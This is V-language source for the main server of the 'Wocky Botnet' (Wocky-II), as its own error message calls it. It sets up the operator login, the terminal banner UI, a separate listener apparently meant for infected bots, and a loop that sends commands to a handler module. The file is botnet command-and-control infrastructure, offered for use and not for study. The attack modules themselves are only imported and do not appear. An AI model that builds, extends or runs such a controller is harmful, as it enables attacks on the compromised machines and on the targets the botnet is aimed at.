/*

@title: Wocky-II
@since: 7/21/21
@creator: vZy

*/
import server
import auth
import wocky_cp
import wocky_uix
import wocky_utils
import config
import banner_sys
import utils
import os
import io
import net
import net.http
import time
// #include "@VROOT/c_headers/test.c"
// #include <unistd.h>
// fn read(int, string, int) int
fn C.check()
// fn C.fdopen(int, string)

fn main() {
	// C.check()
	time.sleep(5)
	println(config.Clear)
	mut port := wocky_cp.port_check(os.args)
	wocky_cp.conn_check() or {
		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
	}
	//wocky_cp.check_update()
	//wocky_cp.licence_valiation()
	go listener(port)
	println('[+] NET Started on Port: $port')
	wocky_cp.command_handler()
}

fn listener(port string) {
	mut server := net.listen_tcp(.ip6, ':${port}') or {
		panic("[x] Error, Unable to start server!\r\n")
	}
	for {
		mut socket := server.accept() or {
			panic("[x] Error, Unable to accept the connection!\r\n")
		}
		go handle_client(mut socket)
	}
}

fn bot_listener(port string) {
	mut server := net.listen_tcp(.ip6, ':562') or {
		panic("[x] Error, Unable to start server!\r\n")
	}
	for {
		mut socket := server.accept() or {
			panic("[x] Error, Unable to accept the connection!\r\n")
		}
		go handle_client(mut socket)
	}
}


fn handle_client(mut socket net.TcpConn) {
	mut u := utils.CLI{}
	mut c_s := utils.Wocky_Settings{}
	mut wuix := wocky_uix.UIX_Func{}
	mut b := banner_sys.Banner{file: "ui"}
	u.set_title(mut socket, "${c_s.get_settings()[1]} | Login") // wow just wow. im to high for this LOL
	u.resize_terminal(mut socket, 22, 114)
	mut reader := io.new_buffered_reader(reader: socket)
	mut current_ip := socket.peer_addr() or { return } //User's IP
	println('> new client: $current_ip')
	socket.set_read_timeout(time.infinite)

	/*
	Logging In System!
	*/
	socket.write_string("Username: ") or { 0 }
	mut username := reader.read_line() or { "" }
	username = username.replace("\r\n", "")
	socket.write_string("Password: ${config.Black}") or { 0 }
	mut password := reader.read_line() or { "" }
	password = password.replace("\r\n", "")
	mut a := auth.AuthInfo{username: username, password: password}
	mut login := a.login()
	if login.contains("[+]") {
		//append user to arr
		// config.current_users << [((config.server_info).len+1), username, socket, current_ips]
		socket.write_string(login) or { 0 }
	} else {
		socket.write_string(login) or { 0 }
		socket.close() or { panic("[x] Error, Failed to close the socket!") }
	}

	/*
	Command Handler
	*/

	
	mut empty_c := 0
	b.username = username
	u.set_title(mut socket, "${c_s.get_settings()[1]} | User: $username")
	b.loading_screen(mut socket)
	socket.write_string(config.Clear) or { 0 }
	b.set_bannerfile("home")
	b.start_banner_output(mut socket)
	b.set_bannerfile("text")
	b.read_banner_text(mut socket)
	mut hostname_cursor := c_s.get_settings()[1].split(",")
	wuix.sock_move_cursor(mut socket, 21, 37)
	for {
		// u.set_title(mut socket, "${c_s.get_settings()[1]} | User: $username")
		mut data := reader.read_line() or { "" }
		data = data.replace("\r\n", "")
		if data.len == 0 {
			empty_c += 1
			if empty_c > 10 {
				println('User disconnected ${socket.peer_addr()}')
				socket.close() or { lol() }
				break
			}
			// println('${empty_c} fell in here')
		}
		server.cmd_handler(mut socket, data, username) // Main Command Handler
	}
	reader.free()
}

fn lol() {

}